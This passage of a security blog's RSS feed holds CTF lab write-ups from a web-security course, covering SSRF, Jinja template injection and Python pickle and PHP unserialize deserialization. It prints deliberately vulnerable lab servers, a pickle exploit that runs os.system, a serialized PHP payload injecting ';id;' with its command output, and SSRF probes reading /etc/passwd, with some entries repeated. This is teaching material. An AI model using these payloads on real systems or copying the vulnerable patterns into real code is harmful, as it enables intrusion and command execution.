+&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
+&lt;h2 id="exploit---ssrf">
+ Exploit - SSRF
+ &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
+&lt;/h2>
+&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
+&lt;ol>
+&lt;li>
+&lt;p>Test it
+&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
+&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>Analyze &lt;code>flag.php&lt;/code>
+&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
+:::spoiler source code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
+?&amp;gt;
+&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
+ Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;?php
+if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
+ echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
+&lt;/code>&lt;/pre>&lt;p>:::
+If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</guid><description>&lt;h1 id="simple-web-0x13lab---ssrfrog">
+ Simple Web 0x13(Lab - SSRFrog)
+ &lt;a class="anchor" href="#simple-web-0x13lab---ssrfrog">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8501/">http://h4ck3r.quest:8501/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://pjchender.dev/javascript/js-set/">javascript Set()&lt;/a>
+&lt;a href="https://youtu.be/hWC-Evt-sBc?t=9867">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
+&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler source code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#34;express&amp;#34;);
+const http = require(&amp;#34;http&amp;#34;);
+
+const app = express();
+
+app.get(&amp;#34;/source&amp;#34;, (req, res) =&amp;gt; {
+ return res.sendFile(__filename);
+})
+app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
+ const { url } = req.query;
+ if (!url || typeof url !== &amp;#39;string&amp;#39;) return res.sendFile(__dirname + &amp;#34;/index.html&amp;#34;);
+
+ // no duplicate characters in `url`
+ if (url.length !== new Set(url).size) return res.sendFile(__dirname + &amp;#34;/frog.png&amp;#34;);
+
+ try {
+ http.get(url, resp =&amp;gt; {
+ resp.setEncoding(&amp;#34;utf-8&amp;#34;);
+ resp.statusCode === 200 ? resp.on(&amp;#39;data&amp;#39;, data =&amp;gt; res.send(data)) : res.send(&amp;#34;:(&amp;#34;);
+ }).on(&amp;#39;error&amp;#39;, () =&amp;gt; res.send(&amp;#34;WTF?&amp;#34;));
+ } catch (error) {
+ res.send(&amp;#34;WTF?&amp;#34;);
+ }
+});
+
+app.listen(3000, &amp;#39;0.0.0.0&amp;#39;);
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</guid><description>&lt;h1 id="simple-web-0x14lab---debug">
+ Simple Web 0x14(Lab - Debug)
+ &lt;a class="anchor" href="#simple-web-0x14lab---debug">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9020/">http://h4ck3r.quest:9020/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler source code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, Response
+import urllib.request
+import json
+
+app = Flask(__name__)
+
+app.config[&amp;#39;FLAG&amp;#39;] = &amp;#34;FL4G{fake_flag}&amp;#34;
+
+@app.route(&amp;#39;/&amp;#39;)
+def index():
+ return &amp;#39;&amp;#39;&amp;#39;
+&amp;lt;form action=&amp;#34;/proxy&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;url&amp;#34; placeholder=&amp;#34;URL&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/debug&amp;#34;&amp;gt;Debug&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
+&amp;#39;&amp;#39;&amp;#39;
+
+@app.route(&amp;#34;/proxy&amp;#34;)
+def proxy():
+ url = request.args.get(&amp;#34;url&amp;#34;)
+ if url is None:
+ return &amp;#34;No URL provided&amp;#34;
+ if &amp;#34;https://&amp;#34; not in url:
+ url = &amp;#34;https://&amp;#34; + url
+ try:
+ with urllib.request.urlopen(url) as response:
+ return response.read()
+ except urllib.error.HTTPError as e:
+ return str(e)
+
+@app.route(&amp;#34;/debug&amp;#34;)
+def debug():
+ # only allow access for localhost
+ if request.remote_addr != &amp;#34;127.0.0.1&amp;#34;:
+ return &amp;#34;Access denied&amp;#34;, 403
+ return json.dumps(app.config, default=lambda _: None)
+
+@app.route(&amp;#34;/source&amp;#34;)
+def source():
+ import re
+ source_code = open(__file__).read()
+ source_code = re.sub(r&amp;#39;FLAG{.*}&amp;#39;, r&amp;#39;FL4G{fake_flag}&amp;#39;, source_code, count=1)
+ return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
+ Simple Web 0x15.5(Pickle)
+ &lt;a class="anchor" href="#simple-web-0x155pickle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background---pickle">
+ Background - Pickle
+ &lt;a class="anchor" href="#background---pickle">#&lt;/a>
+&lt;/h2>
+&lt;p>Python magic method: &lt;code>__reduce__&lt;/code>
+&lt;code>__recude__&lt;/code> is used to define what needs to be done when deserializing.
+&lt;a href="https://youtu.be/73uI7BK8k3g?t=236">Web Hacking | 終章【EDU-CTF 2021】&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler &lt;code>exploit.py&lt;/code>&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">import pickle
+import os
+import pickletools
+
+class exploit(object):
+ def __reduce__(self):
+ return (os.system, (&amp;#39;pwd&amp;#39;,))
+ 
+
+serialized = pickle.dumps(exploit())
+print(bytes.hex(serialized))
+optim_s = pickletools.optimize(serialized)
+print(pickletools.dis(serialized))
+print(pickletools.dis(optim_s))
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
+&lt;hr>
+&lt;p>:::spoiler server_app.py&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">import pickle
+
+serialized = bytes.fromhex(input(&amp;#39;Data: &amp;#39;))
+pickle.loads(serialized)
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15(Lab - `Jinja`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/ssti/simple-web-0x15lab---jinja/</guid><description>&lt;h1 id="simple-web-0x15lab---jinja">
+ Simple Web 0x15(Lab - &lt;code>Jinja&lt;/code>)
+ &lt;a class="anchor" href="#simple-web-0x15lab---jinja">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8700/">http://h4ck3r.quest:8700/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://youtu.be/_hasOTGximc?t=5863">Web Security 0x1&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, render_template_string, request, send_file
+
+app = Flask(__name__)
+
+
+@app.get(&amp;#34;/&amp;#34;)
+def home():
+ return render_template_string(&amp;#34;&amp;#34;&amp;#34;
+ &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
+ &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;Your name&amp;#34;&amp;gt;
+ &amp;lt;button&amp;gt;submit&amp;lt;/button&amp;gt;
+ &amp;lt;/form&amp;gt;
+ &amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
+ &amp;#34;&amp;#34;&amp;#34;)
+
+
+@app.post(&amp;#34;/&amp;#34;)
+def welcome_message():
+ name = request.form.get(&amp;#39;name&amp;#39;)
+ return render_template_string(&amp;#34;&amp;lt;p&amp;gt;Hello, &amp;#34; + name + &amp;#34;&amp;lt;/p&amp;gt;&amp;#34;)
+
+
+@app.get(&amp;#34;/source&amp;#34;)
+def source():
+ return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)
+
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+ app.run(threaded=True, debug=True)
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16.5(php unserialize)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16.5php-unserialize/</guid><description>&lt;h1 id="simple-web-0x165php-unserialize">
+ Simple Web 0x16.5(php unserialize)
+ &lt;a class="anchor" href="#simple-web-0x165php-unserialize">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>php magic method
+&lt;img src="https://i.imgur.com/xQrh7vo.png" alt="" />&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">class cat
+{
+ public $sound = &amp;#39;ls&amp;#39;;
+ function __wakeup()
+ {
+ system(&amp;#34;echo&amp;#34;.$this-&amp;gt;sound);
+ }
+}
+$cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
+&lt;/code>&lt;/pre>&lt;h2 id="description--analyze">
+ Description &amp;amp; Analyze
+ &lt;a class="anchor" href="#description--analyze">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ php -a
+php &amp;gt; class cat
+php &amp;gt; public {
+php { public $sound = &amp;#39;ls&amp;#39;;
+php { function __wakeup()
+php { {
+php { system(&amp;#34;echo &amp;#34;.$this-&amp;gt;sound);
+php { }
+php { }
+php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;meow&amp;#34;;}&amp;#39;;
+php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
+meow
+php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;;id;&amp;#34;;}&amp;#39;;
+php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);
+
+uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
+&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
+ Simple Web 0x16(Lab - Pickle)
+ &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
+Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
+import base64
+import pickle
+
+app = Flask(__name__)
+
+
+@app.route(&amp;#34;/sauce&amp;#34;)
+def sauce():
+ return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)
+
+
+@app.route(&amp;#34;/&amp;#34;)
+def main():
+ session = request.cookies.get(&amp;#34;session&amp;#34;)
+ if session == None:
+ return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;
+
+ else:
+ user = pickle.loads(base64.b64decode(session))
+ return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;
+
+
+@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
+def login():
+ user = base64.b64encode(pickle.dumps({
+ &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
+ &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
+ }))
+ resp = make_response(redirect(&amp;#39;/&amp;#39;))
+ resp.set_cookie(&amp;#34;session&amp;#34;, user)
+ return resp
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
+ Simple Web 0x16(Lab - Pickle)
+ &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
+Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
+import base64
+import pickle
+
+app = Flask(__name__)
+
+
+@app.route(&amp;#34;/sauce&amp;#34;)
+def sauce():
+ return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)
+
+
+@app.route(&amp;#34;/&amp;#34;)
+def main():
+ session = request.cookies.get(&amp;#34;session&amp;#34;)
+ if session == None:
+ return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
+ &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;
+
+ else:
+ user = pickle.loads(base64.b64decode(session))
+ return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;
+
+
+@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
+def login():
+ user = base64.b64encode(pickle.dumps({
+ &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
+ &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
+ }))
+ resp = make_response(redirect(&amp;#39;/&amp;#39;))
+ resp.set_cookie(&amp;#34;session&amp;#34;, user)
+ return resp
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
+ Simple Web 0x17(Lab - Baby Cat)
+ &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Cat
+{
+ public $name = &amp;#39;(guest cat)&amp;#39;;
+ function __construct($name)
+ {
+ $this-&amp;gt;name = $name;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
+ system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
+ echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
+ }
+}
+
+if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
+ $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
+ setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
+} else {
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
+}
+?&amp;gt;
+&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
+&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
+ Simple Web 0x17(Lab - Baby Cat)
+ &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler code&lt;/p>
+&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
+isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));
+
+class Cat
+{
+ public $name = &amp;#39;(guest cat)&amp;#39;;
+ function __construct($name)
+ {
+ $this-&amp;gt;name = $name;
+ }
+ function __wakeup()
+ {
+ echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
+ system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
+ echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
+ }
+}
+
+if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
+ $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
+ setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
+} else {
+ $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
+}
+?&amp;gt;
+&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
+&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
+ Simple Web 0x18(Lab - Magic Cat)
+ &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
